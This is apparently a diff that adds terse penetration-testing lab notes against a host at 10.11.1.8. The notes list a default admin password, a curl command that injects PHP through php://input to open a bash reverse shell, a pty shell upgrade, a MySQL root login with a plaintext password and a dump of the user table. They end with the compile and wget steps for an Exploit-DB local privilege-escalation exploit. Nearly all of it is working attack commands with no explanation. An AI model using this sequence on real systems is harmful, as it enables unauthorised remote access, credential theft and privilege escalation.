@@ -1,0 +1,24 @@
+http://10.11.1.8/robots.txt
+
+http://10.11.1.8/internal/advanced_comment_system/admin.php
+
+password: "admin"
+
+curl -s --data "<?system('bash -i >& /dev/tcp/IP/PORT 0>&1');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+
+mysql --user=root --password=aCs2009offsec
+
+show databases;
+
+use mysql;
+
+SELECT * FROM user;
+
+https://www.exploit-db.com/exploits/9542
+
+gcc -m32 -Wl,--hash-style=both -o exploit 9542.c
+
+wget exploit wget http://IP/exploit
